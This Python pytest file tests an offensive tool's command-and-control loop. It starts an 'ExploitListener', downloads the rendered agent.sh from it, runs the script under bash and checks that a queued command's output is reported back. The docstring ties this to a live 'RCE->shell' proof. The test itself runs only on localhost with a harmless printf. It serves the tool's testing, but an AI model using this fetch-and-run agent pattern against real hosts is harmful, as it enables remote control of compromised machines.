"""M1 agent regression — the REAL bash poll loop must execute jobs end-to-end.

The live RCE->shell proof caught a bug no fake-agent test ever could: the
script's sed regexes expected compact JSON (`"job_id":"x"`) but aiohttp's
`json_response` emits `"job_id": "x"` (space after colon), so the agent
extracted an EMPTY job id and starved forever — poll, poll, no execute, no
report. This test renders the actual agent.sh and runs it under a real bash,
then asserts the reported output lands in the queue.
"""

import asyncio
import shutil
import subprocess
from pathlib import Path

import pytest
from aiohttp import ClientSession

from titan.exploit.listener import ExploitListener, JobQueue


def _find_bash() -> str:
    """A bash that can run the agent script: Git Bash on Windows, /bin/bash
    on CI Linux. `shutil.which("bash")` alone would find the WSL launcher on
    Windows, so Git Bash paths are probed first."""
    candidates = [
        "C:/Program Files/Git/usr/bin/bash.exe",
        "C:/Program Files/Git/bin/bash.exe",
        "/usr/bin/bash",
        "/bin/bash",
    ]
    for c in candidates:
        if Path(c).exists():
            return c
    return shutil.which("bash") or ""


@pytest.mark.asyncio
async def test_real_bash_agent_executes_and_reports(tmp_path: Path):
    bash = _find_bash()
    if not bash:
        pytest.skip("no usable bash on this host")

    q = JobQueue()
    listener = ExploitListener(host="127.0.0.1", port=0, queue=q)
    await listener.start()
    job_id = await q.submit("sess-x", "printf t1t4n_agent_ok")
    try:
        async with ClientSession() as client:
            async with client.get(
                f"{listener.bound_url}/agent.sh", params={"sid": "sess-x"}
            ) as r:
                script = await r.text()
        sf = tmp_path / "agent.sh"
        sf.write_text(script, encoding="utf-8")
        proc = subprocess.Popen(
            [bash, str(sf)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        try:
            # First poll lands ~5s out (+jitter), so allow ~20s.
            result = await asyncio.wait_for(q.wait_result(job_id, 20), timeout=22)
        except (asyncio.TimeoutError, TimeoutError):
            pytest.fail("real bash agent never reported the job")
        finally:
            proc.kill()
        assert result["exit_code"] == 0
        assert "t1t4n_agent_ok" in result["output"]
    finally:
        await listener.stop()
